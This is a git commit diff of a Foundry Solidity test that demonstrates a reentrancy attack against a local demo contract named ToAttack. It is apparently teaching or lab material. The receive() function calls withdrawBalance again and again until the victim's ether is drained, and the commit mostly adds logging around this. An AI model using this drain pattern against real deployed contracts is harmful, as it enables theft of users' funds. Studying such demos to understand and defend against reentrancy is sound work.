729068e4e4e659fdba646a47cdc3ed0682d8280a
whoamins <40am1ns@protonmail.com>
2023-12-05 00:31:33 +0300

    Doing some shit with Foundry tests

--- reentrancy_example/test/AttackerTest.sol
+++ reentrancy_example/test/AttackerTest.sol
@@ -12,30 +12,34 @@ contract AttackerTest is Test {
     function setUp() public {
         victim = new ToAttack();
         owner = payable(msg.sender);
+        console.log("Attacker balance on startup: %d ether", owner.balance / 1 ether);
+        console.log("Attacker smart contract balance on startup: %d ether", address(this).balance / 1 ether);
     }
 
     function testAttack() external payable {
-        console.log("User balance before deposit: %d", victim.getUserBalance());
-        console.log("Victim balance before deposit: %d", address(victim).balance / 1 ether);
-        victim.depositETH{value: 1 ether}();
-        console.log("User balance after deposit: %d", victim.getUserBalance());
+        console.log("Attacker balance on victim smart contract before deposit: %d ether", victim.getUserBalance());
+        console.log("Victim balance on victim smart contract before deposit: %d ether", address(victim).balance / 1 ether);
+        victim.depositETH{value: 10 ether}();
+        require(victim.getUserBalance() == 10, "Deposit is unsuccessful");
+        console.log("Attacker balance after deposit on victim smart contract: %d ether", victim.getUserBalance());
         
         vm.prank(0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC);
         vm.deal(0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC, 123 ether);
         victim.depositETH{value: 100 ether}();
+        require(address(victim).balance / 1 ether == 110, "Deposit from another user is unsuccessful");
 
-        console.log("User balance after second deposit: %d", victim.getUserBalance());
-        console.log("Victim balance after second deposit: %d", address(victim).balance / 1 ether);
+        console.log("Victim balance on victim smart contract after second deposit and before attack: %d ether", address(victim).balance / 1 ether);
 
         victim.withdrawBalance();
     }
 
     receive() external payable {
-        console.log("Victim smart contract balance: %d", address(victim).balance / 1 ether);
         if(address(victim).balance >= 1 ether) {
             victim.withdrawBalance();
         } else {
+            console.log("Attacker balance before transfer: %d", address(owner).balance / 1 ether);
             payable(owner).transfer(address(this).balance);
+            console.log("Attacker balance after transfer: %d", (address(owner).balance / 1 ether) / 2);
         }
     }
 }
